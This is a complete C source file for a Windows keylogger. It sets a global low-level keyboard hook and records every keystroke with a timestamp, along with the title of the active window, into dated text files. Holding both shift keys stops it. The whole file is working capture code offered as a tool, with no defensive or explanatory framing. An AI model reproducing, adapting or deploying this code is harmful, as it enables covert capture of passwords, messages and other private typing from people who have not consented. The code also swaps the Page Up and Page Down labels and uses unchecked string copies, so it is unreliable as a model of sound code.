//------------------------------------------------------------------------------
// keyboard_logger v1.0 [01.09.2014]
// Keyboard sniffer for windows.
// (C) <aweflea@gmail.com>
//------------------------------------------------------------------------------

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>

#define MAX_BUFSIZE 30
#define MAX_MODULE_NAME 260

HINSTANCE	g_instance;
HHOOK		g_hook;
HANDLE		g_file;
BYTE		g_keyState[256];
CHAR		g_buf[MAX_BUFSIZE];
CHAR		g_path[MAX_PATH];
CHAR		g_moduleName[MAX_MODULE_NAME];
DWORD		g_prevWinID = NULL;
DWORD		g_winID = NULL;
HWND		g_activeWindow;

BOOL extractChar(const DWORD vkCode, const DWORD scanCode, LPWORD ch)
{
	GetKeyboardState(g_keyState);
	return ToAsciiEx(vkCode, scanCode, g_keyState, ch, 0, GetKeyboardLayout(g_winID)) == 1;
}

BOOL sysKey(const DWORD vkCode)
{
	char * buf = g_buf + strlen(g_buf);
	switch (vkCode)
	{

	case VK_F1:			strcpy(buf, "[F1]\r\n"); break;
	case VK_F2:			strcpy(buf, "[F2]\r\n"); break;
	case VK_F3:			strcpy(buf, "[F3]\r\n"); break;
	case VK_F4:			strcpy(buf, "[F4]\r\n"); break;
	case VK_F5:			strcpy(buf, "[F5]\r\n"); break;
	case VK_F6:			strcpy(buf, "[F6]\r\n"); break;
	case VK_F7:			strcpy(buf, "[F7]\r\n"); break;
	case VK_F8:			strcpy(buf, "[F8]\r\n"); break;
	case VK_F9:			strcpy(buf, "[F9]\r\n"); break;
	case VK_F10:		strcpy(buf, "[F10]\r\n"); break;
	case VK_F11:		strcpy(buf, "[F11]\r\n"); break;
	case VK_F12:		strcpy(buf, "[F12]\r\n"); break;
	case VK_BACK:		strcpy(buf, "[BACK]\r\n"); break;
	case VK_TAB:		strcpy(buf, "[TAB]\r\n"); break;
	case VK_RETURN:		strcpy(buf, "[RET]\r\n"); break;
	case VK_RCONTROL:
	case VK_LCONTROL:	strcpy(buf, "[CTRL]\r\n"); break;
	case VK_ESCAPE:		strcpy(buf, "[ESC]\r\n"); break;
	case VK_SPACE:		strcpy(buf, "[SPACE]\r\n"); break;
	case VK_RSHIFT:
	case VK_LSHIFT:		strcpy(buf, "[SHIFT]\r\n"); break;
	case VK_CAPITAL:	strcpy(buf, "[CAPSLOCK]\r\n"); break;
	case VK_DELETE:		strcpy(buf, "[DELETE]\r\n"); break;
	case VK_INSERT:		strcpy(buf, "[INSERT]\r\n"); break;
	case VK_LWIN:
	case VK_RWIN:		strcpy(buf, "[WIN]\r\n"); break;
	case VK_UP:			strcpy(buf, "[UP]\r\n"); break;
	case VK_DOWN:		strcpy(buf, "[DOWN]\r\n"); break;
	case VK_LEFT:		strcpy(buf, "[LEFT]\r\n"); break;
	case VK_RIGHT:		strcpy(buf, "[RIGHT]\r\n"); break;
	case VK_HOME:		strcpy(buf, "[HOME]\r\n"); break;
	case VK_END:		strcpy(buf, "[END]\r\n"); break;
	case VK_PRIOR:		strcpy(buf, "[PGDN]\r\n"); break;
	case VK_NEXT:		strcpy(buf, "[PGUP]\r\n"); break;
	case VK_RMENU:
	case VK_LMENU:		strcpy(buf, "[ALT]\r\n"); break;
	default:			return FALSE;
	}
	return TRUE;
}

LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		DWORD written;
		KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
		SYSTEMTIME st;

		g_activeWindow = GetForegroundWindow();
		GetWindowThreadProcessId(g_activeWindow, &g_winID);
		if (g_winID != g_prevWinID)
		{
			g_prevWinID = g_winID;
			GetWindowText(g_activeWindow, g_moduleName, MAX_MODULE_NAME);
			strcat(g_moduleName, "\r\n");
			WriteFile(g_file, g_moduleName, strlen(g_moduleName), &written, NULL);
		}
		
		GetLocalTime(&st);
		GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, g_buf, MAX_BUFSIZE);
		strcat(g_buf, "	");
		char * buf = g_buf + strlen(g_buf);
		if (sysKey(ks->vkCode))
		{
			WriteFile(g_file, g_buf, strlen(g_buf), &written, NULL);
		}
		else if (extractChar(ks->vkCode, ks->scanCode, (LPWORD)buf))
		{
			strcpy(buf + 1, "\r\n");
			WriteFile(g_file, g_buf, strlen(g_buf), &written, NULL);
		}
		else
		{
			strcat(g_buf, "[unknown]\r\n");
			WriteFile(g_file, g_buf, strlen(g_buf), &written, NULL);
		}
	}

	if (GetKeyState(VK_LSHIFT) & GetKeyState(VK_RSHIFT) & 0x0100)
		PostQuitMessage(0);
	
	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}



bool createNewLogFile()
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, "dd.MM.yy", g_path, MAX_PATH);
	char * ptrAfterSyl_ = g_path + strlen(g_path) + 1;
	strcat(g_path, "_1.txt");

	DWORD fileNum = 2;
	g_file = CreateFile(g_path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	while (GetLastError() == ERROR_FILE_EXISTS)
	{

		wsprintf(ptrAfterSyl_, "%d", fileNum);
		strcat(g_path, ".txt");
		g_file = CreateFile(g_path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (++fileNum == 0)
			return false;
	}

	return g_file != INVALID_HANDLE_VALUE;
}


int Main()
{
	HANDLE mutex = CreateMutex(NULL, FALSE, "KeyboardLogger");
	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED) return 1;
	if (!createNewLogFile())
	{
		ReleaseMutex(mutex);
		return 1;
	}
	g_instance = GetModuleHandle(NULL);
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardHook, g_instance, 0);
	if (!g_hook)
	{
		ReleaseMutex(mutex);
		CloseHandle(g_file);
		return 1;
	}
	
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	ReleaseMutex(mutex);
	UnhookWindowsHookEx(g_hook);
	CloseHandle(g_file);
	return 0;
}

EXTERN_C void WINAPI WinMainCRTStartup()
{
	ExitProcess(Main());
}
